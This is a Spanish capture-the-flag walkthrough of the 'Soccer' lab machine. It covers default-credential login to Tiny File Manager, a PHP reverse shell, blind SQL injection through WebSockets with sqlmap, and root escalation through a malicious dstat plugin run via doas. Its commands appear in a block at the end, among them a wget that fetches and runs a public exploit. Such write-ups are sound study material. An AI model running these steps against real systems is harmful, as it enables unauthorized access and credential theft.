# Soccer

![](../../../../~gitbook/image.md)Publicado: 12 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Soccer es una máquina Linux de dificultad Easy que presenta múltiples vectores de ataque interesantes. La explotación inicial se basa en el descubrimiento de un Tiny File Manager vulnerable alojado en un directorio oculto, el cual utiliza credenciales por defecto. Aunque los exploits públicos fallan debido a restricciones de permisos, es posible aprovechar la funcionalidad nativa del file manager para crear y modificar archivos PHP, permitiendo la ejecución de una reverse shell.La escalada horizontal involucra el descubrimiento de un segundo vhost mediante enumeración de configuraciones de nginx. Este nuevo sitio web contiene una aplicación con funcionalidad de tickets que es vulnerable a SQL Injection ciega a través de WebSockets, lo que permite extraer credenciales de la base de datos usando sqlmap.Finalmente, la escalada de privilegios se logra mediante el binario doas (alternativa a sudo) que permite ejecutar dstat como root. Aprovechando la capacidad de dstat para cargar plugins de Python personalizados desde directorios escribibles, es posible ejecutar código arbitrario con privilegios de root.Esta máquina es excelente para practicar técnicas de enumeración web avanzada, explotación de file managers, SQL injection en protocolos no convencionales y escalada de privilegios mediante binarios menos comunes.
###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos y servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###🌐 Enumeración Web

####HTTP (80)
http://soccer.htb/![](../../../../~gitbook/image.md)
####🕷️Fuzzing de directorios
A priori no tenemos gran cosa, realizamos fuzzing web usando la herramienta gobuster:Gobuster nos revela un recurso poco convencional:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Cuando intentamos acceder, nos redirige automáticamente a un sitio web que está utilizando un servicio llamado tiny file manager y nos encontramos ante un panel de autenticación.Buscamos y probamos credenciales por defecto de este servicioEn el sitio web https://exploit-notes.hdks.org/exploit/web/tiny-file-manager-pentesting/ encontramos credenciales por defecto para este servicio:![[Pasted image 20250527123255.png]]![](../../../../~gitbook/image.md)Logramos entrar y enumeramos la versión del servicio:![](../../../../~gitbook/image.md)
###💻 Explotación
Parece que esta versión es vulnerable y existen algunos exploits públicos:https://github.com/febinrev/tinyfilemanager-2.4.3-exploitDescargamos la versión en python de este exploit: https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.pyEste exploit no nos funciona porque el directorio /var/www/html/tiny no tiene permisos de escritura y no nos permite subir ahí el payload![](../../../../~gitbook/image.md)Tampoco nos funciona si intentamos incrustar una webshell php dentro del codigo tinyfilemanager.php:Probamos con este otro exploit:Obtenemos el mismo error, no tenemos permisos para subir nada a la ruta por defecto:![](../../../../~gitbook/image.md)Cambiemos el enfoque, el file manager de tiny nos da la opción de copiar y mover archivos y directorios. Vamos a usar la utilidad Copy para crear una copia de tinyfilemanager.php de la siguiente forma:![](../../../../~gitbook/image.md)A continuación renombramos el archivo a shell.php, le damos permisos de ejecución (que de inicio no los tiene) y reemplazamos el código por el de una reverse shell php de pentestmonkey:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Ahora solo nos queda iniciar un listener y cuando hagamos click en Open ganaremos una reverse shell![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Una vez dentro de la máquina, vamos a busca archivos de configuración de nginx por si pudiera haber otros vhosts alojados:Localizamos la instalación de nginx en /etc/nginx y en su interior está el archivo nginx.confEste archivo nos indica que la configuración de los vhosts está definida en estos otros archivos:![](../../../../~gitbook/image.md)Descubrimos un nuevo subdominio:![](../../../../~gitbook/image.md)Lo añadimos en el fichero /etc/hosts de nuesto host de ataque y accedemos:http://soc-player.soccer.htb/![](../../../../~gitbook/image.md)La web tiene un formulario de registro, nos registramos usando las siguientes credendiales:Al acceder con nuestra nueva cuenta, tenemos una sección de tickets:Revisando el código fuente de la página encontramos un script que indica la petición que se está realizando mediante websocket:![](../../../../~gitbook/image.md)Al jugar con el formulario de tickets tenemos un error de ticket no existe:![](../../../../~gitbook/image.md)Vamos a ver con Burp como se está enviando esta petición y manipularla para ver si es vulnerable a SQLI y en efecto lo es, ya que logramos que nos diga que el ticket es válido.![](../../../../~gitbook/image.md)Usamos sqlmap de la siguiente forma para automatizar la blind sqli injection:![](images/Pasted%20image%20 20250527123522.png)Relizamos un dump de la base de datos soccer_db![](../../../../~gitbook/image.md)
Obtenemos un nombre de usuario y una contraseña. Anteriormente enumeramos dos usuarios en el directorio /home de la máquina que habíamos comprometido y uno de ellos era player, podemos ver si el usuario está reutilizando la contraseña para varios servicios.Ahora ya podemos capturamos la flag en el directorio del usuario player.
####👑 Escalada de privilegios
Enumeramos binarios con SUID:De la lista, hay varios binarios con bit SetUID, pero el que se parece más a `sudo` y no es `sudo` es:🔸 `/usr/local/bin/doas`
####✅ ¿Por qué doas?
- `doas` es una alternativa a `sudo` que permite ejecutar comandos como otro usuario (normalmente root).
- Se originó en OpenBSD y algunas distros de Linux lo usan como una alternativa más simple y segura que `sudo`.
- Al tener el bit SetUID, puede ejecutarse con privilegios elevados, igual que `sudo`.
Si está configurado correctamente (en `/etc/doas.conf`) y tu usuario tiene permiso, deberíamos obtener algo como:Dstat es una herramienta para generar estadísticas de recursos del sistema. Su manual ofrece información interesante, especialmente la posibilidad de usar complementos de Python para la herramienta.Si podemos ejecutar código Python como usuario root, podríamos generar un shell con los privilegios elevados intactos.
Aunque los complementos de dstat solo se pueden alojar en ciertos directorios, tenemos acceso de escritura a uno de ellos: /usr/local/share/dstat. Esto significa que potencialmente podemos explotar este acceso para ejecutar código arbitrario como usuario root.Creamos un script de Python que genera un shell bash y lo guardamos en el directorio mencionado anteriormente, asegurándonos de anteponerle dstat_, según el manual.Para verificar que dstat detecte el complemento, ejecutamos el comando con el indicador --list.Finalmente, después de confirmar que nuestro complemento es detectado, ejecutamos dstat y especificamos el complemento pasándolo como un argumento de línea de comando, usando un prefijo --.![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
ping -c2 10.10.11.194
PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data.
64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=47.9 ms
64 bytes from 10.10.11.194: icmp_seq=2 ttl=63 time=47.6 ms

--- 10.10.11.194 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 47.642/47.763/47.885/0.121 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.194 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)

echo $ports
22,80,9091
```

```
nmap -sC -sV -p$ports 10.10.11.194
```

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
...[snip]...
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
```

```
echo "10.10.11.194 soccer.htb" | sudo tee -a /etc/hosts
```

```
gobuster dir -u http://soccer.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -b 403,404 -x .php, .txt, .xml -r
```

```

```

```
wget https://www.exploit-db.com/raw/50828 -O exploit.sh
dos2unix exploit.sh
chmod +x exploit.sh
./exploit.sh http://soccer.htb/tiny/tinyfilemanager.php admin "admin@123"
```

```
nc -nlvp 1234
```

```
find / -type d -name "nginx" 2&>/dev/null
```

```
prueba@test.es
test
```

```
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
```

```
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch
```

```
www-data@soccer:/etc/nginx/sites-enabled$ su player
su player
Password: PlayerOftheMatch2022
whoami
player
/bin/bash -i
player@soccer:/etc/nginx/sites-enabled$
```

```
find / -perm -4000 -type f 2>/dev/null
```

```
cat /usr/local/etc/doas.conf
```

```
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
```

```
doas /usr/bin/dstat --list
```

```
doas /usr/bin/dstat --pwn
```
